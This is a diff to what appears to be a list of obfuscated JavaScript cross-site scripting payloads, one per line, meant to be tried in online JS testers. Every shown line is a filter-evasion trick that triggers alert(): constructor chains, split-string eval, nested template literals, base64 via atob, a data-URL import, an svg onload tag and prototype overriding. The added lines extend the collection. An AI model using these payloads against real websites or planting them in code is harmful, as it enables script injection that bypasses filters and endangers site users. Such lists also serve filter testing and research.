@@ -1,5 +1,6 @@
 Execute : http://www.webtoolkitonline.com/javascript-tester.html OR https://jsfiddle.net
-
+Per Line
+------------------------------------------------------------------------------------------
 
 [][`filter`][`constructor`](`ale`.concat(`rt\x28`.concat`0\x29`))();//
 eval('ale'+'rt(0)');
@@ -41,3 +42,9 @@ window[Symbol.hasInstance]=eval
 atob`YWxlcnQoMSk` instanceof window
 location='http://\u{e01cc}\u{e01cd}\u{e01ce}\u{e01cf}\u{e01d0}\u{e01d1}\u{e01d2}\u{e01d3}\u{e01d4}\u{e01d5}google\u{e01da}\u{e01db}\u{e01dc}\u{e01dd}\u{e01de}\u{e01df}.com'
 document.write("<s","crip","t>al","ert(","1)","</s","cript>")
+eval(`${`${`${`${`${`a`}`}`}`}`}${`${`${`${`${`l`}`}`}`}`}${`${`${`${`${`e`}`}`}`}`}${`${`${`${`${`r`}`}`}`}`}${`${`${`${`${`t`}`}`}`}`}${`${`${`${`${`(1)`}`}`}`}`}`)
+;[].constructor.prototype.join=function(){return'pwnd'};eval('alert(1)')
+import('data:text/javascript,alert(1)')
+<svg•onload=alert(1)>
+this[Object["keys"](this)[146]](1)
+this[Object["keys"](this)[5]](1)
